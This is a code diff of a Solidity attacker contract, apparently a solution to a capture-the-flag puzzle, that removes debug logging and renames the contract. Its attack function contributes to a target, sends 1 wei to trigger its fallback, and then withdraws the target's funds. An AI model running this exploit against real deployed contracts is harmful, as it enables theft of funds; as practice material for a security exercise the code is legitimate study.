@@ -1,15 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "hardhat/console.sol";
-
 interface targetInterface {
     function contribute() external payable;
 
     function withdraw() external;
 }
 
-contract Attacker {
+contract FallbackAttacker {
     address private targetAddress;
     targetInterface private target;
     address private owner;
@@ -23,13 +21,9 @@ contract Attacker {
     receive() external payable {}
 
     function attack() public {
-        console.log("1", address(this).balance);
         target.contribute{value: 0.001 ether - 1}();
-        console.log("2", address(this).balance, targetAddress);
         payable(targetAddress).transfer(1);
-        console.log("3", address(this).balance);
         target.withdraw();
-        console.log("4", address(this).balance);
     }
 
     function withdraw() public {
